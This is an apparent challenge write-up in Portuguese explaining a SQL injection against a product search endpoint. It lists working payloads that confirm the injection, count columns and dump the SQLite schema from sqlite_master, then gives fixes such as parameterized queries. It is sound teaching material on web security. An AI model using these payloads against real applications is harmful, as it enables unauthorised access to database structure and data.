Esse desafio mostra um **ataque de SQL Injection (SQLi)** voltado para **exfiltrar o esquema completo do banco de dados (DB Schema)**, explorando a tabela especial **`sqlite_master`** do SQLite.

---

### 🔍 **Como funciona o ataque?**

1. A aplicação usa **SQLite** e tem uma vulnerabilidade de SQL Injection no parâmetro **`q`** da rota `/rest/products/search`.

2. O atacante envia **payloads SQL** até encontrar uma forma de unir (`UNION SELECT`) os resultados da tabela normal de produtos com os dados de **`sqlite_master`**, que contém o **DDL (CREATE TABLE / CREATE INDEX)** de todas as tabelas.

3. A tabela **`sqlite_master`** tem uma coluna chamada **`sql`**, que guarda o comando SQL usado para criar cada tabela/índice.

---

### 🔑 **Etapas do ataque explicado**

#### ✅ **1) Confirmar a injeção**

O atacante envia:

```
'))--
```

➡️ Isso fecha a query e comenta o restante, confirmando que há **SQL Injection**.

---

#### ✅ **2) Testar UNION SELECT**

Envia:

```
')) UNION SELECT * FROM sqlite_master--
```

➡️ O erro **"no such table: x"** confirma que `sqlite_master` existe.

---

#### ✅ **3) Descobrir o número de colunas da query original**

Ele tenta várias combinações:

```
')) UNION SELECT '1' FROM sqlite_master--   ❌ Erro: poucas colunas
')) UNION SELECT '1','2' FROM sqlite_master-- ❌ Erro
')) UNION SELECT '1','2','3',...,'9' FROM sqlite_master-- ✅ Finalmente funciona
```

Ou seja, a query original retorna **9 colunas**, então o UNION precisa ter **9 valores**.

---

#### ✅ **4) Extrair o schema**

Agora, troca o **primeiro valor** pelo campo **`sql`** (que contém o CREATE TABLE):

```
')) UNION SELECT sql,'2','3','4','5','6','7','8','9' FROM sqlite_master--
```

A resposta JSON retorna objetos como:

```json
{
  "id": "CREATE TABLE Users(id INTEGER PRIMARY KEY, ... )",
  "name": "2",
  "description": "3",
  ...
}
```

Ou seja, o atacante consegue **baixar a definição de todas as tabelas**.

---

### 🔥 **Por que isso é perigoso?**

* Com o **schema completo**, o invasor descobre **nomes de tabelas, colunas, tipos de dados e relacionamentos**.
* Isso facilita ataques futuros como:
  ✅ Roubo de dados com SELECTs específicos
  ✅ Escalada para **SQLi avançado** (INSERT/UPDATE/DELETE)
  ✅ Quebra de autenticação (sabendo onde ficam senhas e tokens)

---

### 📌 **Qual é a vulnerabilidade?**

✅ **SQL Injection (SQLi)** → A aplicação **não faz validação/escape do parâmetro `q`**, permitindo injetar comandos SQL arbitrários.

---

### 🔐 **Como corrigir?**

1. Usar **queries parametrizadas (prepared statements)** em vez de concatenar strings SQL.
2. Validar a entrada do usuário (whitelist, filtros).
3. Nunca exibir mensagens de erro detalhadas do banco para o usuário.
